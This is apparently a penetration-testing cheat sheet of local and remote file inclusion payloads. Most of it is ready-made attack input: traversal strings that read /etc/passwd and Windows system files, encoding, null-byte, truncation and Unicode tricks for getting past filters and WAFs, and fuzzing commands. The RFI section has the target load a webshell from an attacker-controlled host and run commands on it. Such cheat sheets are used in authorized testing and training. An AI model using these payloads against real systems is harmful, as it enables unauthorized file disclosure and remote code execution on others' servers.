# LFI/RFI Payloads

{% hint style="info" %}
For Linux: **/etc/passwd** and **/etc/hosts**. For Windows: **/windows/win.ini**, **\windows\win.ini** and **\windows\system32\drivers\etc\hosts**
{% endhint %}

## LFI payloads

### Manual

```bash
file=/etc/passwd
file=/etc/passwd?
file=../../../../../etc/passwd 
file=/../../../../etc/passwd
file=....//....//....//etc/passwd # If the code deletes ../, then we do this: ....// and when it deletes it, it will look like this: ../
file=..././..././..././..././..././..././etc/passwd
file=....\/....\/....\/etc/passwd
file=%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd # %5c = \
file=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
file=..//..//..//..//..//etc/passwd # Works with 2 slashes or more.
file=<POSSIBLE_PATH>/../../../etc/passwd # Ex: /var/www/images
file=../../../../etc/passwd%00
file=../../../../etc/passwd%00.png 
file=/etc/passwd%00 # POST method.
```

Sometimes browsers get complicated with basic directory traversal sequences, but wget can work:

```bash
wget <URL>?file=../../../../../../../etc/passwd
```

Directory traversal with a slash **/** at the beginning. This is because sometimes the file is called "**lang\_**", and if we use a simple payload, it will be invalid because it would look like this: **lang\_../../../../etc/passwd** . Instead, with this one: **lang\_/.../.../etc/passwd**

```bash
file=/../../../../etc/passwd
```

The following payload only works if you run it in Bash. If it is in PHP, the wildcards (**?** and **\***) will not be replaced by a "**.**":

```bash
file=.?/.*/.?/etc/passwd
```

We can also use special encodings or simply encode twice in URL format:

{% hint style="danger" %}
In PHP versions 5.3.4 and earlier, string-based detection could be bypassed by URL-encoding the payload.
{% endhint %}

```bash
# Doble URL Encode:
file=<DOUBLE URL ENCODING =  "../../../../etc/passwd">
%2e%2e%2f = ../
%252e%252e%252f = ../
%2e%2e%5c = ..\
# Special encodings: %252f = ../ - %c0%af = /
file=..%252f..%252f..%252fetc%252fpasswd
file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
# Others encodings:
# dot             %c0%2e  %e0%40%ae  %c0ae etc.
# forward slash   %c0%af  %e0%80%af  %c0%2f etc.
# backslash       %c0%5c  %c0%80%5c  etc.
```

Path truncation in PHP. Always tries to start the path with a fake directory (a/). This vulnerability was fixed in PHP 5.3:

```bash
file=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\. # 
file=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
# With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)
file=a/./.[ADD MORE]/etc/passwd
file=a/../../../../[ADD MORE]../../../../../etc/passwd
```

{% embed url="https://jbedelsec.wordpress.com/2018/12/11/exploiting-php-file-truncation-php-5-3" %}

PHP versions prior to 5.5 are vulnerable to **null byte injection**, which means that adding a null byte to the end of the filename should bypass the extension check. For example: `language=/etc/passwd%00` will result in the `include("/etc/passwd%00.php")` statement, where the server ignores everything after the null byte.

{% hint style="info" %}
This happens because C and C++ consider strings to end with null bytes, while PHP does not. The URL-encoded null byte (%00) at the end of the filename is appended to .php but is truncated to /etc/passwd\x00 by the APIs written in C. This results in the inclusion of /etc/passwd instead of /etc/passwd.php when the include() function is called.
{% endhint %}

```bash
# Null byte:
file=../../../../etc/passwd%00.png
```

#### Unicode WAF bypass

**Unicode Compatibility** is a form of _Unicode Equivalence_ which ensures that between characters or sequences of characters which may have distinct visual appearances or behaviors, the same abstract character is represented. For example, `ğ•ƒ` is normalized to `L`. This behaviour could open the door to abuse some weak implementations that _performs unicode compatibility after the input is sanitized_.

**NFKC** and **NKFD** are the ones that are interesting because they perform _compatibility_, to check this behaviour, we could use this Python snippet:

```python
import unicodedata
string = "ğ•·ğ–Šğ–›ğ–ğ–˜ğ–‚ğ–ğ–“ğ–Œğ–˜"
print ('NFC: ' + unicodedata.normalize('NFC', string))
print ('NFD: ' + unicodedata.normalize('NFD', string))
print ('NFKC: ' + unicodedata.normalize('NFKC', string))
print ('NFKD: ' + unicodedata.normalize('NFKD', string))

# Output
NFC: ğ•·ğ–Šğ–›ğ–ğ–˜ğ–‚ğ–ğ–“ğ–Œğ–˜
NFD: ğ•·ğ–Šğ–›ğ–ğ–˜ğ–‚ğ–ğ–“ğ–Œğ–˜
NFKC: LevisWings
NFKD: LevisWings

# Payloads:
ğ•·ğ–Šğ–›ğ–ğ–˜ğ–‚ğ–ğ–“ğ–Œğ–˜
%F0%9D%95%B7%F0%9D%96%8A%F0%9D%96%9B%F0%9D%96%8E%F0%9D%96%98%F0%9D%96%82%F0%9D%96%8E%F0%9D%96%93%F0%9D%96%8C%F0%9D%96%98
```

### Wordlists

```bash
# Linux:
wget https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/dirTraversal-nix.txt
wget https://raw.githubusercontent.com/carlospolop/Auto_Wordlists/main/wordlists/file_inclusion_linux.txt
# Windows:
wget https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/dirTraversal-win.txt
wget https://raw.githubusercontent.com/carlospolop/Auto_Wordlists/main/wordlists/file_inclusion_windows.txt
# Fuzz with ffuf:
ffuf -c -w <WORDLIST> -u '<URL>/index.php?page=FUZZ'
```

## RFI Payloads

{% hint style="danger" %}
Remember to test with **uppercase** and **lowercase prefixes** such as **http**, **ftp**, etc.
{% endhint %}

```bash
<URL>?filename=http://<LHOST>/asd # On web server.
<URL>?filename=ftp://<LHOST>/asd # On FTP server.
<URL>?filename=ftp://user:pass@<LHOST>/asd # On FTP server with credentials.
<URL>?filename=\\<LHOST>\smbFolder\asd # On SMB server (Windows only).
```

After verifying that it is vulnerable, we can create a code (which will be our webshell) in the server language (PHP, ASPX, etc.). You can go to the [WebShells ](../../../general/reverse-shells/web-shells.md)section to find webshells in different programming languages.

We can then pull up an HTTP, FTP, SMB, etc. server and run the payload to point it against our webshell:

```bash
<URL>?filename=http://<LHOST>/shell.php&cmd=whoami # On web server.
<URL>?filename=ftp://<LHOST>/shell.php&whoami # On FTP server.
<URL>?filename=\\<LHOST>\smbFolder\shell.php&whoami # On SMB server (Windows only)
```
